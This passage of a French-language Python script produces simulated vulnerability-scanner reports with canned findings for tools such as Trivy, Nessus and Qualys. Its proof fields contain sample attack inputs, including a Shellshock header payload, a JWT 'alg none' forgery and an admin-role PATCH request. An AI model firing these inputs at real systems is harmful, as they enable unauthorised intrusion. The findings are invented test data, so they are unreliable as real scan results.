                url=f"http://{target}/admin/users",
                description="Un utilisateur standard peut accéder aux fonctionnalités admin via l'API.",
                impact="Escalade de privilèges vers le rôle administrateur.",
                recommandation=(
                    "1. Implémenter des contrôles d'autorisation côté SERVEUR.\n"
                    "2. Utiliser un système RBAC centralisé."
                ),
                preuve='PATCH /api/users/me | {"role": "admin"} → HTTP 200 | Accès admin obtenu',
            ),
            build_vuln(
                titre="JWT - Algorithme 'none' accepté",
                severite="MEDIUM",
                url=f"http://{target}/api/auth",
                description="La bibliothèque JWT accepte l'algorithme 'none'.",
                impact="Forge de tokens JWT avec n'importe quel payload.",
                recommandation="Rejeter l'algorithme 'none'. Utiliser RS256 ou ES256.",
                preuve="Token modifié: {alg:'none'}.{sub:'admin'} → Accepté",
            ),
            build_vuln(
                titre="En-têtes CORS trop permissifs",
                severite="MEDIUM",
                url=f"http://{target}/api/",
                description="CORS autorise toutes les origines avec credentials activés.",
                impact="Requêtes cross-origin malveillantes dans le contexte utilisateur.",
                recommandation="Définir une liste blanche d'origines autorisées.",
                preuve="Access-Control-Allow-Origin: * + Allow-Credentials: true",
            ),
            build_vuln(
                titre="Rate Limiting absent sur l'authentification",
                severite="LOW",
                url=f"http://{target}/api/auth/login",
                description="L'endpoint de connexion n'a pas de limitation de débit.",
                impact="Attaques de force brute facilitées.",
                recommandation=(
                    "1. Limiter à 5 tentatives / 15 min par IP.\n"
                    "2. Ajouter un CAPTCHA après 3 échecs.\n"
                    "3. Verrouiller le compte après N échecs."
                ),
                preuve="1000 requêtes POST en 60s → aucun blocage",
            ),
        ]
    }


def simulate_trivy(target, scan_id):
    return {
        "status": "success",
        "scanner": "TRIVY",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Vulnérabilité critique dans l'image Ubuntu 20.04 (Looney Tunables)",
                severite="CRITICAL",
                cve_id="CVE-2023-4911",
                description="glibc 2.31 vulnérable — buffer overflow dans GLIBC_TUNABLES.",
                impact="Escalade de privilèges root dans le conteneur.",
                recommandation="Reconstruire l'image avec ubuntu:22.04.",
                preuve="libc6:2.31-13 dans ubuntu:20.04 | GLIBC_TUNABLES exploit PoC disponible",
            ),
            build_vuln(
                titre="Secret AWS exposé dans le conteneur",
                severite="CRITICAL",
                description="Credentials AWS actifs trouvés dans /app/.env du conteneur.",
                impact="Accès complet au compte AWS, exfiltration S3, coûts illimités.",
                recommandation=(
                    "1. Révoquer IMMÉDIATEMENT les credentials AWS.\n"
                    "2. Utiliser AWS IAM Roles.\n"
                    "3. Ajouter .env dans .dockerignore."
                ),
                preuve="/app/.env | AWS_ACCESS_KEY_ID=AKIA5X... exposé",
            ),
            build_vuln(
                titre="Conteneur s'exécutant en tant que root",
                severite="HIGH",
                description="Le conteneur s'exécute avec UID 0 (root).",
                impact="En cas de compromission, l'attaquant obtient root immédiatement.",
                recommandation="Ajouter USER appuser dans le Dockerfile.",
                preuve="docker inspect → User: '' (root)",
            ),
            build_vuln(
                titre="Package Alpine vulnérable - curl 7.79.1",
                severite="HIGH",
                cve_id="CVE-2022-32221",
                description="curl 7.79.1 dans Alpine 3.14 vulnérable.",
                impact="Envoi de données sensibles vers des destinations non prévues.",
                recommandation="Mettre à jour vers alpine:3.18+.",
                preuve="curl/7.79.1 dans alpine:3.14",
            ),
            build_vuln(
                titre="Dockerfile - Instructions non sécurisées",
                severite="MEDIUM",
                description=(
                    "ADD utilisé au lieu de COPY, secrets via ARG, image :latest non épinglée."
                ),
                impact="Risque d'exposition de secrets, images non reproductibles.",
                recommandation="Remplacer ADD par COPY. Épingler les images avec digest SHA256.",
                preuve="Dockerfile: ADD http://... | ARG DB_PASSWORD | FROM python:latest",
            ),
            build_vuln(
                titre="Kubernetes - Pod sans Security Context",
                severite="MEDIUM",
                description="Aucun securityContext défini sur les pods et containers analysés.",
                impact="Les conteneurs peuvent s'exécuter avec des privilèges élevés.",
                recommandation="Définir runAsNonRoot: true, readOnlyRootFilesystem: true.",
                preuve="deployment.yaml | securityContext: {} absent sur 5 pods",
            ),
            build_vuln(
                titre="Image Docker volumineuse - Surface d'attaque étendue",
                severite="LOW",
                description="L'image fait 2.3 GB avec des outils de développement inutiles.",
                impact="Surface d'attaque étendue, temps de démarrage plus long.",
                recommandation="Utiliser des builds multi-stage et des images distroless.",
                preuve="docker image ls → app:latest | 2.34 GB | 47 layers",
            ),
        ]
    }


def simulate_nessus(target, scan_id):
    return {
        "status": "success",
        "scanner": "NESSUS",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="MS17-010 EternalBlue - Windows SMB RCE",
                severite="CRITICAL",
                cve_id="CVE-2017-0144",
                description="Système Windows non patché contre MS17-010. SMBv1 activé.",
                impact="RCE complète, propagation wormable, ransomware.",
                recommandation=(
                    "1. Appliquer KB4012212 (MS17-010).\n"
                    "2. Désactiver SMBv1.\n"
                    "3. Segmenter le système sur un VLAN isolé."
                ),
                preuve=f"Nessus plugin 97833 | SMBv1 + MS17-010 patch absent sur {target}",
            ),
            build_vuln(
                titre="Certificat SSL expiré",
                severite="HIGH",
                description="Certificat SSL expiré depuis 45 jours, algorithme SHA-1.",
                impact="Connexions non sécurisées, vulnérabilité MITM.",
                recommandation=(
                    "1. Renouveler immédiatement le certificat.\n"
                    "2. Migrer vers Let's Encrypt avec auto-renouvellement.\n"
                    "3. Utiliser SHA-256 minimum."
                ),
                preuve=f"Certificat expiré: NotAfter=2023-11-01 | sha1WithRSA sur {target}:443",
            ),
            build_vuln(
                titre="Routeur Cisco IOS non patché",
                severite="HIGH",
                cve_id="CVE-2018-0171",
                description="Cisco IOS 15.4 avec Smart Install RCE, port 4786 ouvert.",
                impact="Prise de contrôle complète du routeur.",
                recommandation=(
                    "1. Mettre à jour IOS vers 15.9(3)M+.\n"
                    "2. Désactiver Smart Install: no vstack.\n"
                    "3. Désactiver l'interface web si non nécessaire."
                ),
                preuve=f"Cisco IOS 15.4(3)M7 | Port 4786 ouvert sur {target}",
            ),
            build_vuln(
                titre="Service Telnet non chiffré actif",
                severite="MEDIUM",
                description="Telnet (port 23) actif — toutes les données en clair.",
                impact="Interception des credentials d'administration en clair.",
                recommandation="Désactiver Telnet. Migrer vers SSH v2.",
                preuve=f"Port 23/TCP ouvert | telnet {target} → connexion établie",
            ),
            build_vuln(
                titre="Services inutiles exposés",
                severite="LOW",
                description="Ports 111 (RPCbind), 2049 (NFS), 6000 (X11), 8080 exposés.",
                impact="Surface d'attaque élargie.",
                recommandation="Désactiver les services non nécessaires. Bloquer les ports inutilisés.",
                preuve=f"nmap -sV {target} → 23 ports ouverts dont 8 non justifiés",
            ),
        ]
    }


def simulate_qualys(target, scan_id):
    return {
        "status": "success",
        "scanner": "QUALYS",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Bucket S3 AWS accessible publiquement",
                severite="CRITICAL",
                description=(
                    "Bucket S3 en accès public détecté via CNAME DNS. "
                    "Contient des dumps de BDD et fichiers de configuration."
                ),
                impact="Accès public à des données sensibles, violation RGPD.",
                recommandation=(
                    "1. Activer Block Public Access sur le bucket S3.\n"
                    "2. Auditer et supprimer les fichiers sensibles.\n"
                    "3. Activer le versioning et la journalisation S3."
                ),
                preuve=f"s3://backup.{target} → ListBucket accessible | 342 objets exposés",
            ),
            build_vuln(
                titre="Shellshock - GNU Bash RCE",
                severite="CRITICAL",
                cve_id="CVE-2014-6271",
                description="Shellshock dans GNU Bash via l'endpoint CGI /cgi-bin/test.cgi.",
                impact="Exécution de commandes système à distance sans authentification.",
                recommandation="Mettre à jour bash vers 4.3 patch 25+. Désactiver les scripts CGI.",
                preuve=f"GET /cgi-bin/test.cgi | User-Agent: () {{ :;}}; /bin/id → uid=33(www-data)",
            ),
            build_vuln(
                titre="Domaine de phishing détecté - Typosquatting",
                severite="HIGH",
                description="Domaine malveillant imitant ce site avec certificat SSL valide.",
                impact="Vol de credentials utilisateurs via phishing ciblé.",
                recommandation=(
                    "1. Signaler le domaine aux registraires.\n"
                    "2. Déposer des variantes du domaine.\n"
                    "3. Contacter le CERT/CSIRT national."
                ),
                preuve=f"Domaine: {target.replace('.', '-')}.attacker.com | Copie conforme",
            ),
            build_vuln(
                titre="Configuration DMARC/DKIM/SPF absente",
                severite="HIGH",
                description="SPF, DKIM et DMARC absents — email spoofing possible.",
                impact="Usurpation d'identité par email, campagnes de phishing.",
                recommandation=(
                    "1. Configurer SPF: v=spf1 include:_spf.google.com ~all\n"
                    "2. Activer DKIM.\n"
                    "3. Configurer DMARC: v=DMARC1; p=reject;"
                ),
                preuve=f"dig TXT {target} → SPF absent | DMARC absent | DKIM absent",
            ),
            build_vuln(
                titre="Interface d'administration exposée publiquement",
                severite="MEDIUM",
                url=f"http://{target}/admin",
                description="Panneau d'administration accessible depuis Internet, indexé par Google.",
                impact="Exposition aux attaques de force brute.",
                recommandation=(
                    "1. Restreindre /admin aux IPs de l'équipe IT.\n"
                    "2. Mettre le panneau admin derrière un VPN.\n"
                    "3. Ajouter MFA sur l'accès admin."
                ),
                preuve=f"http://{target}/admin accessible publiquement | Google Dork détecté",
            ),
            build_vuln(
                titre="Informations de version dans les métadonnées",
                severite="LOW",
                description="Versions exposées dans les commentaires HTML et meta tags.",
                impact="Facilite le ciblage d'exploits spécifiques.",
                recommandation="Supprimer les commentaires. Mettre à jour jQuery vers 3.7.1+.",
                preuve="<!-- WordPress 6.0.1 --> dans le source | jquery-1.12.4.min.js",
            ),
        ]
    }


def simulate_manual(target, scan_id):
    return {
        "status": "success",
        "scanner": "MANUAL",
        "target": target,
        "scan_id": scan_id,
        "data": [
            build_vuln(
                titre="Contrôle d'accès insuffisant (test manuel)",
                severite="HIGH",
                description=(
                    "Lors d'un test de pénétration manuel, certaines fonctionnalités "
                    "sensibles ne vérifient pas correctement les droits d'accès."
                ),
                impact="Accès non autorisé à des fonctionnalités administratives.",
                recommandation=(
                    "1. Implémenter des vérifications d'autorisation côté serveur.\n"
                    "2. Adopter un framework RBAC.\n"
                    "3. Tests d'autorisation automatisés."
                ),
                preuve="GET /api/admin/users avec session utilisateur standard → HTTP 200 OK",
            ),
            build_vuln(
                titre="Absence de journalisation des événements de sécurité",
                severite="MEDIUM",
                description=(
                    "L'application ne journalise pas les événements de sécurité critiques : "
                    "connexions échouées, accès sensibles, modifications importantes."
                ),
                impact="Impossibilité de détecter des attaques, non-conformité ISO 27001.",
                recommandation=(
                    "1. Implémenter une journalisation centralisée (ELK, Splunk).\n"
                    "2. Logger authentifications et accès aux données sensibles.\n"
                    "3. Configurer des alertes SIEM."
                ),
                preuve="Vérification manuelle — aucun événement de sécurité applicatif dans /var/log/",
            ),
        ]
    }


# ====================== MAIN ======================
def main():
    parser = argparse.ArgumentParser(description="Scanner Security Platform")
    parser.add_argument('--tool', required=True,
                        choices=['nuclei', 'openvas', 'grype', 'zap',
                                 'burp_suite', 'trivy', 'nessus', 'qualys', 'manual'])
    parser.add_argument('--target', required=True)
    parser.add_argument('--scan-id', required=True)
    args = parser.parse_args()

    print(f"[Python] Scan simulé → Tool: {args.tool.upper()} | Cible: {args.target}",
          file=sys.stderr)

    try:
        simulators = {
            'nuclei'    : simulate_nuclei,
            'openvas'   : simulate_openvas,
            'grype'     : simulate_grype,
            'zap'       : simulate_zap,
            'burp_suite': simulate_burp_suite,
            'trivy'     : simulate_trivy,
            'nessus'    : simulate_nessus,
            'qualys'    : simulate_qualys,
            'manual'    : simulate_manual,
        }

        simulator = simulators.get(args.tool)
        if not simulator:
            raise ValueError(f"Tool non implémenté: {args.tool}")

        output = simulator(args.target, args.scan_id)
        print(json.dumps(output, ensure_ascii=False, default=str))

    except Exception as e:
        print(json.dumps({
            "status" : "error",
            "scanner": args.tool.upper(),
            "target" : args.target,
            "scan_id": args.scan_id,
            "error"  : str(e),
        }))
        sys.exit(1)


if __name__ == "__main__":
    main()